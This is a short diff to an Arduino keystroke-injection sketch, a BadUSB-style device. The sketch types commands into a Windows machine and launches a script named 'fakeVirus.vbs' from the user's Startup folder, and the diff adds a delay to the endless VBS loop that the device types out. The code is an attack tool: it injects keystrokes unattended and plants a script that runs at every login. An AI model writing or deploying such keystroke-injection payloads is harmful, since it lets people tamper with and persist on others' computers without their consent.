@@ -68,6 +68,12 @@ void setup() {
   Keyboard.releaseAll();
   delay(delayTime);
 
+  //start vbs
+  Keyboard.println("\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\fakeVirus.vbs\"");
+  Keyboard.press(enter);
+  Keyboard.releaseAll();
+  delay(delayTime);
+  
   //close cmd
   closeProgram();
   
@@ -82,6 +88,7 @@ void vbsContent() {
   Keyboard.println("Dim max,min");
   Keyboard.println("max=1");
   Keyboard.println("min=0");
+  Keyboard.println("Wscript.sleep 1000");
   Keyboard.println("While True");
   Keyboard.println("Dim random");
   Keyboard.println("Randomize");
